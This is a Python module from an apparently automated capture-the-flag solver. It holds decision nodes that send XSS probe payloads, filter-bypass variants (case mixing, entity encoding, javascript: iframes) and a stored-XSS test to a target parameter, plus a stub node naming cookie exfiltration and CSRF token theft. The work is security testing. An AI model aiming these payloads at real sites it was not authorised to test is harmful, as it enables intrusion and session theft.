"""Cross-Site Scripting (XSS) detection trees.

Implements XSS detection from detections.md:
- W-X.1: Reflected XSS detection (payload echoed in HTML)
- W-X.2: Stored XSS detection (persistence across requests)
- W-X.3: Filter analysis (what gets blocked?)
"""
from typing import Dict, Any, Optional
import logging
import re
import html

from ctf_autopwn.core.nodes import DecisionNode
from ctf_autopwn.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from ctf_autopwn.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class XSSDetectReflectedNode(DecisionNode):
    """W-X.1: Reflected XSS detection."""
    
    def __init__(self):
        super().__init__("xss_detect_reflected", "XSS: Reflected Payloads")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test reflected XSS."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[xss] Testing reflected XSS on {param_name}")
        
        # XSS payloads with unique markers
        xss_payloads = [
            "<script>alert('XSS_TEST')</script>",
            "<img src=x onerror=alert('XSS_TEST')>",
            "<svg onload=alert('XSS_TEST')>",
            "<body onload=alert('XSS_TEST')>",
            "';alert('XSS_TEST');//",
            '";alert("XSS_TEST");//',
        ]
        
        try:
            for payload in xss_payloads:
                url = f"{endpoint}?{param_name}={payload}"
                result = self.curl.run(url, {})
                body = result.get("body", "")
                
                # Check if payload is reflected unencoded
                if payload in body:
                    logger.info(f"[xss] Reflected XSS found!")
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={
                            "is_reflected_xss": True,
                            "payload": payload,
                        }
                    )
                
                # Check for partial reflection (script tag without encoding)
                if "<script>" in body or "alert(" in body:
                    logger.info(f"[xss] Reflected XSS found (partial)!")
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={
                            "is_reflected_xss": True,
                            "payload": payload,
                        }
                    )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_reflected_xss": False}
            )
        
        except Exception as e:
            logger.error(f"[xss] Reflected test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_reflected_xss"):
                return XSSExploitNode()
            else:
                return XSSDetectStoredNode()
        return None


class XSSDetectStoredNode(DecisionNode):
    """W-X.2: Stored XSS detection."""
    
    def __init__(self):
        super().__init__("xss_detect_stored", "XSS: Stored XSS")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test stored XSS by submitting and re-checking."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[xss] Testing stored XSS on {param_name}")
        
        # Payload with unique marker
        unique_marker = "STORED_XSS_TEST_12345"
        payload = f"<script>alert('{unique_marker}')</script>"
        
        try:
            # Step 1: Submit payload (might be a POST or form)
            url_submit = f"{endpoint}?{param_name}={payload}"
            result_submit = self.curl.run(url_submit, {})
            
            # Step 2: Retrieve page (might need different URL)
            result_retrieve = self.curl.run(endpoint, {})
            body_retrieve = result_retrieve.get("body", "")
            
            # Check if marker appears in retrieved page
            if unique_marker in body_retrieve:
                logger.info(f"[xss] Stored XSS detected!")
                return NodeResult(
                    status=NodeStatus.SUCCESS,
                    data={"is_stored_xss": True}
                )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_stored_xss": False}
            )
        
        except Exception as e:
            logger.error(f"[xss] Stored test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class XSSDetectFilterNode(DecisionNode):
    """W-X.3: XSS filter analysis - understand what gets blocked."""
    
    def __init__(self):
        super().__init__("xss_detect_filter", "XSS: Filter Analysis")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Analyze XSS filters to find bypass techniques."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[xss] Analyzing filters on {param_name}")
        
        # Test various bypass techniques
        bypass_techniques = [
            ("case_variation", "<ScRiPt>alert('xss')</sCrIpT>"),
            ("attribute_encoding", "<img src=x &#111;nerror=alert('xss')>"),
            ("event_handler", "<svg/onload=alert('xss')>"),
            ("tag_substitution", "<iframe src=javascript:alert('xss')>"),
            ("encoded_angle", "&lt;script&gt;alert('xss')&lt;/script&gt;"),
        ]
        
        bypass_found = []
        
        try:
            for tech_name, payload in bypass_techniques:
                url = f"{endpoint}?{param_name}={payload}"
                result = self.curl.run(url, {})
                body = result.get("body", "")
                
                # Check if payload executed (would need dynamic analysis in real scenario)
                # For now, just check if it wasn't fully encoded
                if "<script>" in body or "alert(" in body or "onload=" in body:
                    bypass_found.append(tech_name)
                    logger.debug(f"[xss] Bypass found: {tech_name}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "filter_bypasses": bypass_found,
                    "fully_filtered": len(bypass_found) == 0,
                }
            )
        
        except Exception as e:
            logger.error(f"[xss] Filter analysis failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class XSSExploitNode(DecisionNode):
    """Exploit XSS vulnerability to execute JavaScript."""
    
    def __init__(self):
        super().__init__("xss_exploit", "XSS: Execute Payload")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Execute XSS payload and extract data."""
        logger.info(f"[xss] Exploiting XSS")
        
        # Typical XSS exploits:
        # 1. Session stealing (document.cookie)
        # 2. Keylogging
        # 3. Phishing
        # 4. Malware distribution
        # 5. CSRF attacks
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "exploitation": "xss",
                "methods": [
                    "cookie_exfil",
                    "csrf_token_theft",
                    "phishing_redirect",
                ]
            }
        )


# Summary
"""
Cross-Site Scripting Detection Trees (W-XSS)

Detection nodes:
- W-X.1 (XSSDetectReflectedNode) - Reflected XSS
- W-X.2 (XSSDetectStoredNode) - Stored/persistent XSS
- W-X.3 (XSSDetectFilterNode) - Filter bypass analysis

Exploitation nodes:
- XSSExploitNode - Execute JavaScript and extract data

Used by web reconnaissance to test user input parameters.
"""
